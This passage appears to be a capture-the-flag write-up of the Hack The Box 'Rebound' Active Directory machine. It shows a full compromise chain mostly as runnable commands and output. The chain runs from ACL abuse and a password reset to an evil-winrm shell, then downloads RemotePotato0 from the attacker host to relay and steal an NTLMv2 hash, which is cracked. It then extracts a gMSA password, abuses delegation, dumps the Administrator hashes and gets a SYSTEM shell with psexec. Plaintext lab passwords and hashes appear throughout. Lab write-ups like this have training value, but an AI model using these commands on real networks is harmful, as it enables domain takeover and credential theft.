nTSecurityDescriptor.ACL.2.Trustee: oorend
nTSecurityDescriptor.ACL.2.Right: WRITE_VALIDATED
nTSecurityDescriptor.ACL.2.ObjectType: Self
```

## Foothold

> https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/10_post_exploitation.md#dacleditpy

> https://raw.githubusercontent.com/fortra/impacket/204c5b6b73f4d44bce0243a8f345f00e308c9c20/examples/dacledit.py

> https://raw.githubusercontent.com/Porchetta-Industries/CrackMapExec/master/cme/helpers/msada_guids.py

```c
┌──(user㉿kali)-[/media/…/htb/machines/rebound/files]
└─$ impacket-getTGT rebound.htb/oorend:'1GR8t@$$4u'                                                                                                                             
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Saving ticket in oorend.ccache
```

```c
┌──(user㉿kali)-[/media/…/htb/machines/rebound/files]
└─$ export KRB5CCNAME=oorend.ccache
```

```c
┌──(user㉿kali)-[~]
└─$ bloodyAD -d rebound.htb -u 'oorend' -p '1GR8t@$$4u' --host 10.129.112.203 add groupMember 'CN=ServiceMgmt,CN=Users,DC=rebound,DC=htb' 'CN=oorend,CN=Users,DC=rebound,DC=htb'
[+] CN=oorend,CN=Users,DC=rebound,DC=htb added to CN=ServiceMgmt,CN=Users,DC=rebound,DC=htb
```

```c
┌──(user㉿kali)-[/media/…/htb/machines/rebound/files]
└─$ python3 dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'oorend' -target-dn 'OU=Service Users,DC=rebound,DC=htb' 'rebound.htb/oorend:1GR8t@$$4u' -k -use-ldaps
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] NB: objects with adminCount=1 will no inherit ACEs from their parent container/OU
[*] DACL backed up to dacledit-20230911-010220.bak
[*] DACL modified successfully!
```

```c
┌──(user㉿kali)-[~]
└─$ bloodyAD -d rebound.htb -u 'oorend' -p '1GR8t@$$4u' --host 10.129.112.203 set password winrm_svc 'Pa$$w0rd!'
[+] Password changed successfully!
```

```c
┌──(user㉿kali)-[~]
└─$ evil-winrm -i 10.129.112.203 -u 'winrm_svc' -p 'Pa$$w0rd!'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\winrm_svc\Documents>
```

## user.txt

```c
*Evil-WinRM* PS C:\Users\winrm_svc\Desktop> type user.txt
d7e8f2a2c6b9b0009cf283a9524bc760
```

## Enumeration

```c
*Evil-WinRM* PS C:\> whoami /all

USER INFORMATION
----------------

User Name         SID
================= ==============================================
rebound\winrm_svc S-1-5-21-4078382237-1492182817-2568127209-7684


GROUP INFORMATION
-----------------

Group Name                                  Type             SID          Attributes
=========================================== ================ ============ ==================================================
Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access     Alias            S-1-5-32-574 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

## Privilege Escalation to TBrady

> https://msrndcdn360.blob.core.windows.net/bluehat/bluehatil/2022/assets/doc/Relaying%20to%20Greatness%20Windows%20Privilege%20Escalation%20by%20abusing%20the%20RPCDCOM%20protocols__Andrea%20Pierini%20Antonio%20Cocomazzi.pdf

> https://github.com/3ndG4me/socat/releases/tag/v1.7.3.3

> https://github.com/antonioCoco/RemotePotato0

```c
┌──(user㉿kali)-[/media/…/htb/machines/rebound/serve]
└─$ ls -la
total 1008
drwxrwx--- 1 root vboxsf     82 Sep 11 06:51 .
drwxrwx--- 1 root vboxsf     56 Sep 11 06:43 ..
-rwxrwx--- 1 root vboxsf 152064 Sep 11 06:45 RemotePotato0.exe
-rwxrwx--- 1 root vboxsf 379672 Dec  7  2021 socatx64.bin
```

```c
┌──(user㉿kali)-[/media/…/htb/machines/rebound/serve]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```c
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> iwr 10.10.16.12/RemotePotato0.exe -o RemotePotato0.exe
```

```c
┌──(user㉿kali)-[/media/…/htb/machines/rebound/serve]
└─$ sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:dc01.rebound.htb:8888
> 2023/09/11 14:59:00.000476060  length=116 from=0 to=115
..\v.....t...........................`R.......!4z.....]........\b.+.H`............`R.......!4z....,..l..@E............< 2023/09/11 14:59:00.000755673  length=84 from=0 to=83
..\f.....T...........L.E...8888...........]........\b.+.H`............................> 2023/09/11 14:59:00.000944787  length=24 from=116 to=139
........................< 2023/09/11 14:59:01.000197173  length=40 from=84 to=123
........(...............................> 2023/09/11 14:59:01.000951401  length=120 from=0 to=119
..\v\a....x.(.........L.E.............`R.......!4z.....]........\b.+.H`....
.......NTLMSSP.......\b.................
.cE....< 2023/09/11 14:59:02.000205319  length=272 from=0 to=271
..\f\a................L.E...8888...........]........\b.+.H`....
.......NTLMSSP.........8...........:V.\\............F...
.cE....r.e.b.o.u.n.d.....r.e.b.o.u.n.d...\b.D.C.0.1.....r.e.b.o.u.n.d...h.t.b... .d.c.0.1...r.e.b.o.u.n.d...h.t.b.....r.e.b.o.u.n.d...h.t.b.\a.\b.w..~........> 2023/09/11 14:59:02.000454128  length=490 from=120 to=609
...\a................
.......NTLMSSP.........z...,.,.........X...\f.\f.f...\b.\b.r...............
.cE...........P.1i"}kK.r.e.b.o.u.n.d.t.b.r.a.d.y.D.C.0.1.............................s....u\a.u9.-........w..~.......Q............r.e.b.o.u.n.d...\b.D.C.0.1.....r.e.b.o.u.n.d...h.t.b... .d.c.0.1...r.e.b.o.u.n.d...h.t.b.....r.e.b.o.u.n.d...h.t.b.\a.\b.w..~............\b.0.0............ .....7h!.)....`..R....n.(.Sc4G^d..
...................     .".R.P.C.S.S./.1.0...1.0...1.6...1.2..........2'.0..>H..U.M.$> 2023/09/11 14:59:02.000545448  length=80 from=610 to=689
........P...............P.=..J..........\a...............
...........'.\r:Sz......< 2023/09/11 14:59:02.000834344  length=32 from=272 to=303
........ ....... ...............> 2023/09/11 14:59:03.000566046  length=72 from=0 to=71
..\v.....H...........L.E.............`R.......!4z.....]........\b.+.H`....< 2023/09/11 14:59:03.000735250  length=60 from=0 to=59
..\f.....<...........L.E...8888...........]........\b.+.H`....> 2023/09/11 14:59:03.000959802  length=42 from=72 to=113
........*...............P.=..J..........\a.< 2023/09/11 14:59:04.000210938  length=108 from=60 to=167
........l.......T...................\a.1.2.7...0...0...1.[.9.9.9.7.].....
...........""33DDUUUUUU......\a.....
```

```c
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> .\RemotePotato0.exe -m 2 -r 10.10.16.12 -x 10.10.16.12 -p 8888 -s 1
[*] Detected a Windows Server version not compatible with JuicyPotato. RogueOxidResolver must be run remotely. Remember to forward tcp port 135 on 10.10.16.12 to your victim machine on port 8888
[*] Example Network redirector:
        sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:{{ThisMachineIp}}:8888
[*] Starting the RPC server to capture the credentials hash from the user authentication!!
[*] Spawning COM object in the session: 1
[*] Calling StandardGetInstanceFromIStorage with CLSID:{5167B42F-C111-47A1-ACC4-8EABE61B0B54}
[*] RPC relay server listening on port 9997 ...
[*] Starting RogueOxidResolver RPC Server listening on port 8888 ...
[*] IStoragetrigger written: 104 bytes
[*] ServerAlive2 RPC Call
[*] ResolveOxid2 RPC call
[+] Received the relayed authentication on the RPC relay server on port 9997
[*] Connected to RPC Server 127.0.0.1 on port 8888
[+] User hash stolen!

NTLMv2 Client   : DC01
NTLMv2 Username : rebound\tbrady
NTLMv2 Hash     : tbrady::rebound:474dc984c311747b:336d9f8ab2047a7928d079d2104dc9d0:0101000000000000f7985080c0e4d901c07ccb00466653d80000000002000e007200650062006f0075006e006400010008004400430030003100040016007200650062006f0075006e0064002e006800740062000300200064006300300031002e007200650062006f0075006e0064002e00680074006200050016007200650062006f0075006e0064002e0068007400620007000800f7985080c0e4d901060004000600000008003000300000000000000001000000002000008da1da376821b5299d0516d66005d052848ce8b56eb928cf536334475e6412e30a00100000000000000000000000000000000000090000000000000000000000
```

## Cracking the Hash

```c
┌──(user㉿kali)-[/media/…/htb/machines/rebound/files]
└─$ cat hash_tbrady 
tbrady::rebound:474dc984c311747b:336d9f8ab2047a7928d079d2104dc9d0:0101000000000000f7985080c0e4d901c07ccb00466653d80000000002000e007200650062006f0075006e006400010008004400430030003100040016007200650062006f0075006e0064002e006800740062000300200064006300300031002e007200650062006f0075006e0064002e00680074006200050016007200650062006f0075006e0064002e0068007400620007000800f7985080c0e4d901060004000600000008003000300000000000000001000000002000008da1da376821b5299d0516d66005d052848ce8b56eb928cf536334475e6412e30a00100000000000000000000000000000000000090000000000000000000000
```

```c
┌──(user㉿kali)-[/media/…/htb/machines/rebound/files]
└─$ sudo john hash_tbrady --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
543BOMBOMBUNmanda (tbrady)     
1g 0:00:00:06 DONE (2023-09-11 15:02) 0.1589g/s 1937Kp/s 1937Kc/s 1937KC/s 5449977..5435844
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

| Username | Password |
| --- | --- |
| tbrady | 543BOMBOMBUNmanda |

```c
┌──(user㉿kali)-[/media/…/htb/machines/rebound/files]
└─$ impacket-getTGT rebound.htb/tbrady:'543BOMBOMBUNmanda'                                                                                                                            
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Saving ticket in tbrady.ccache
```

```c
┌──(user㉿kali)-[/media/…/htb/machines/rebound/files]
└─$ export KRB5CCNMAE=tbrady.ccache
```

```c
┌──(user㉿kali)-[~]
└─$ crackmapexec ldap 10.129.112.203 -u 'tbrady' -p '543BOMBOMBUNmanda' --gmsa -k
SMB         10.129.112.203  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False)
LDAP        10.129.112.203  636    DC01             [+] rebound.htb\tbrady:543BOMBOMBUNmanda 
LDAP        10.129.112.203  636    DC01             [*] Getting GMSA Passwords
LDAP        10.129.112.203  636    DC01             Account: delegator$           NTLM: 9b0ccb7d34c670b2a9c81c45bc8befc3
```

## Privilege Escalation to root

```c
┌──(user㉿kali)-[~]
└─$ impacket-getTGT 'rebound.htb/delegator$' -dc-ip dc01.rebound.htb -hashes :9b0ccb7d34c670b2a9c81c45bc8befc3
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Saving ticket in delegator$.ccache
```

```c
┌──(user㉿kali)-[~]
└─$ export KRB5CCNAME=`realpath delegator\$.ccache`
```

```c
┌──(user㉿kali)-[~]
└─$ impacket-rbcd -delegate-from 'ldap_monitor' -delegate-to 'delegator$' 'rebound.htb/delegator$@dc01.rebound.htb' -action write -use-ldaps -k -no-pass
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] ldap_monitor can now impersonate users on delegator$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     ldap_monitor   (S-1-5-21-4078382237-1492182817-2568127209-7681)
```

```c
┌──(user㉿kali)-[~]
└─$ impacket-getTGT 'rebound.htb/ldap_monitor:1GR8t@$$4u' -dc-ip 10.129.112.203
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Saving ticket in ldap_monitor.ccache
```

```c
┌──(user㉿kali)-[~]
└─$ export KRB5CCNAME=`realpath ldap_monitor.ccache`
```

```c
┌──(user㉿kali)-[~]
└─$ impacket-getST 'rebound.htb/ldap_monitor:1GR8t@$$4u' -spn 'browser/dc01.rebound.htb' -impersonate 'dc01$' -k
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Impersonating dc01$
[*]     Requesting S4U2self
[*]     Requesting S4U2Proxy
[*] Saving ticket in dc01$.ccache
```

```c
┌──(user㉿kali)-[~]
└─$ export KRB5CCNAME=`realpath dc01\$.ccache`
```

```c
┌──(user㉿kali)-[~]
└─$ impacket-getST 'rebound.htb/delegator' -hashes :9b0ccb7d34c670b2a9c81c45bc8befc3 -spn http/dc01.rebound.htb -impersonate Administrator -additional-ticket 'dc01$.ccache'
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Getting TGT for user
[*] Impersonating Administrator
[*]     Using additional ticket dc01$.ccache instead of S4U2Self
[*]     Requesting S4U2Proxy
[*] Saving ticket in Administrator.ccache
```

```c
┌──(user㉿kali)-[~]
└─$ export KRB5CCNAME=`realpath Administrator.ccache`
```

```c
┌──(user㉿kali)-[~]
└─$ sudo secretsdump.py dc01.rebound.htb -k -no-pass -just-dc-user administrator
Impacket for Exegol - v0.10.1.dev1+20230909.241.3001b261 - Copyright 2022 Fortra - forked by ThePorgs

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:176be138594933bb67db3b2572fc91b8:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:32fd2c37d71def86d7687c95c62395ffcbeaf13045d1779d6c0b95b056d5adb1
Administrator:aes128-cts-hmac-sha1-96:efc20229b67e032cba60e05a6c21431f
Administrator:des-cbc-md5:ad8ac2a825fe1080
[*] Cleaning up...
```

## Getting root

```c
┌──(user㉿kali)-[~]
└─$ impacket-psexec -hashes 'aad3b435b51404eeaad3b435b51404ee:176be138594933bb67db3b2572fc91b8' 'rebound.htb/Administrator@rebound.htb'
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on rebound.htb.....
[*] Found writable share ADMIN$
[*] Uploading file eHpTFBWW.exe
[*] Opening SVCManager on rebound.htb.....
[*] Creating service XsAK on rebound.htb.....
[*] Starting service XsAK.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.4720]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

## root.txt

```c
C:\Users\Administrator\Desktop> type root.txt
969d37371f8e643a27cf5e0ac3969f44
```

## Credits

Shoutout to `AROx4444` for the heavy lifting!!
